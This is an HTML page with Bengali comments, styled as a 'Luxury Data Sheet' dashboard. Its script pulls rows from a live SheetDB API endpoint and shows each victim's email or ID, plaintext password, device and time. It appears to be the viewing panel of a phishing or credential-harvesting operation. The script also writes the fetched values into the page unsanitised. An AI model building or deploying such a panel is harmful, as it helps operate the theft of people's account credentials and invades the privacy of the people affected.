<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Luxury Data Sheet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    
    <style>
        body {
            background: #050505;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        /* লাক্সারি ব্যাকগ্রাউন্ড এনিমেশন */
        .bg-glow {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 50% 50%, #1e1b4b 0%, #000 80%);
            z-index: -1;
        }

        /* গ্লাস টেবিল ডিজাইন */
        .glass-panel {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            overflow: hidden;
        }

        .table-row {
            transition: all 0.3s ease;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .table-row:hover {
            background: rgba(99, 102, 241, 0.1);
            transform: scale(1.01);
        }

        /* কাস্টম স্ক্রলবার */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="bg-glow"></div>

    <div class="max-w-6xl mx-auto">
        <div class="flex justify-between items-center mb-10 animate__animated animate__fadeIn">
            <div>
                <h1 class="text-3xl font-bold tracking-tight text-indigo-400">Sheet9 <span class="text-white">Database</span></h1>
                <p class="text-gray-500 text-sm">Real-time luxury data monitoring</p>
            </div>
            <div class="px-4 py-2 bg-indigo-600/20 border border-indigo-500/30 rounded-lg text-indigo-400 text-sm">
                Active Connection
            </div>
        </div>

        <div class="glass-panel animate__animated animate__zoomIn">
            <div class="overflow-x-auto">
                <table class="w-full text-left">
                    <thead>
                        <tr class="bg-white/5 text-indigo-300 uppercase text-xs tracking-widest">
                            <th class="p-5">Email/ID</th>
                            <th class="p-5">Password</th>
                            <th class="p-5">Device</th>
                            <th class="p-5 text-right">Time</th>
                        </tr>
                    </thead>
                    <tbody id="table-body">
                        </tbody>
                </table>
            </div>
        </div>

        <div id="loader" class="text-center py-20">
            <div class="inline-block animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-indigo-500"></div>
            <p class="mt-4 text-gray-400 italic">ডাটা লোড হচ্ছে...</p>
        </div>
    </div>

    <script>
        // আপনার দেওয়া API লিঙ্ক
        const API_URL = 'https://sheetdb.io/api/v1/w51cfqk66hrnb?sheet=Sheet9';

        async function loadSheetData() {
            try {
                const response = await fetch(API_URL);
                const data = await response.json();
                
                const tableBody = document.getElementById('table-body');
                const loader = document.getElementById('loader');
                
                tableBody.innerHTML = ''; // ক্লিয়ার করা হচ্ছে

                data.forEach((row, index) => {
                    const tr = document.createElement('tr');
                    tr.className = 'table-row animate__animated animate__fadeInUp';
                    tr.style.animationDelay = `${index * 0.1}s`;

                    tr.innerHTML = `
                        <td class="p-5 font-medium text-gray-200">${row.email || 'N/A'}</td>
                        <td class="p-5">
                            <span class="bg-gray-800 px-3 py-1 rounded text-pink-500 font-mono text-sm border border-white/5">
                                ${row.password || '******'}
                            </span>
                        </td>
                        <td class="p-5">
                            <span class="text-xs bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 px-2 py-1 rounded">
                                ${row.device || 'Mobile'}
                            </span>
                        </td>
                        <td class="p-5 text-right text-gray-400 text-sm">
                            ${row.time || 'No Date'}
                        </td>
                    `;
                    tableBody.appendChild(tr);
                });

                loader.classList.add('hidden'); // ডাটা আসার পর লোডার বন্ধ

            } catch (error) {
                console.error("Error:", error);
                document.getElementById('loader').innerHTML = `<p class="text-red-500">ডাটা লোড করতে সমস্যা হয়েছে। API চেক করুন।</p>`;
            }
        }

        // পেজ লোড হলে ফাংশনটি চলবে
        window.onload = loadSheetData;
    </script>
</body>
      </html>
